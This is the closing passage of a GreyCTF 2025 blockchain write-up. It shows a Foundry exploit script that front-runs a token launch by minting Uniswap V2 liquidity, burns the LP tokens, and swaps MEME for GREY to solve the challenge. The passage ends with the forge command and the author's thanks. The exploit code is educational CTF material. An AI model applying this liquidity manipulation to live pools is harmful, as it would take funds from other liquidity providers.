</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">liquidity</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">mint</span><span class="p">(</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Liquidity minted:&#34;</span><span class="p">,</span> <span class="n">liquidity</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Log reserves after our initial mint
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">(</span><span class="kt">uint112</span> <span class="n">reserve0</span><span class="p">,</span> <span class="kt">uint112</span> <span class="n">reserve1</span><span class="p">,)</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">getReserves</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve0 after mint:&#34;</span><span class="p">,</span> <span class="n">reserve0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve1 after mint:&#34;</span><span class="p">,</span> <span class="n">reserve1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Launch the MEME token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">factory</span><span class="p">.</span><span class="n">launchToken</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">meme</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Log liquidity minted by factory through launch
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">pairLiquidity</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xdEaD</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Factory pair liquidity:&#34;</span><span class="p">,</span> <span class="n">pairLiquidity</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Log current reserves after launch
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">(</span><span class="n">reserve0</span><span class="p">,</span> <span class="n">reserve1</span><span class="p">,)</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">getReserves</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve0 after launch:&#34;</span><span class="p">,</span> <span class="n">reserve0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve1 after launch:&#34;</span><span class="p">,</span> <span class="n">reserve1</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Burn our LP tokens to receive underlying assets
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">pair</span><span class="p">,</span> <span class="n">liquidity</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">uint256</span> <span class="n">amount0</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount1</span><span class="p">)</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">burn</span><span class="p">(</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;new balance of our GREY:&#34;</span><span class="p">,</span> <span class="n">amount0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;new balance of our MEME:&#34;</span><span class="p">,</span> <span class="n">amount1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Get and print reserves after burning
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">(</span><span class="n">reserve0</span><span class="p">,</span> <span class="n">reserve1</span><span class="p">,)</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">getReserves</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve0 after burn:&#34;</span><span class="p">,</span> <span class="n">reserve0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve1 after burn:&#34;</span><span class="p">,</span> <span class="n">reserve1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// Swap all of our MEME token to 1.65 ether of GREY
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">memeBalance</span> <span class="o">=</span> <span class="n">meme</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">meme</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">pair</span><span class="p">,</span> <span class="n">memeBalance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">swap</span><span class="p">(</span><span class="mi">1</span><span class="p">.</span><span class="mi">65</span> <span class="kc">ether</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Now, we have fulfilled the solved condition
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Final GREY balance after swap:&#34;</span><span class="p">,</span> <span class="n">grey</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">sender</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;isSolved:&#34;</span><span class="p">,</span> <span class="n">setup</span><span class="p">.</span><span class="n">isSolved</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To execute it, we can simply run <code>forge script ./script/Counter.s.sol:CounterScript --broadcast</code>. After running that, we will be able to get the flag :).</p>
<img src="https://i.imgur.com/QVkLBqm.png"/>
<p>Thanks to the GreyCTF organizers for creating this educational challenge. It effectively demonstrates a case study of real-world vulnerabilities, helping participants learn more about smart contract security.</p>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/greyctf-2025/" data-title="GreyCTF 2025" data-via="Chovid99" data-hashtags="Writeup,GreyCTF,blockchain,evm,uniswap,2025"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/greyctf-2025/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/greyctf/">GreyCTF</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a>,&nbsp;<a href="/tags/evm/">Evm</a>,&nbsp;<a href="/tags/uniswap/">Uniswap</a>,&nbsp;<a href="/tags/2025/">2025</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/0ctf-2024/" class="prev" rel="prev" title="0CTF 2024"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>0CTF 2024</a>
            <a href="/posts/google-ctf-2025/" class="next" rel="next" title="Google CTF 2025">Google CTF 2025<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
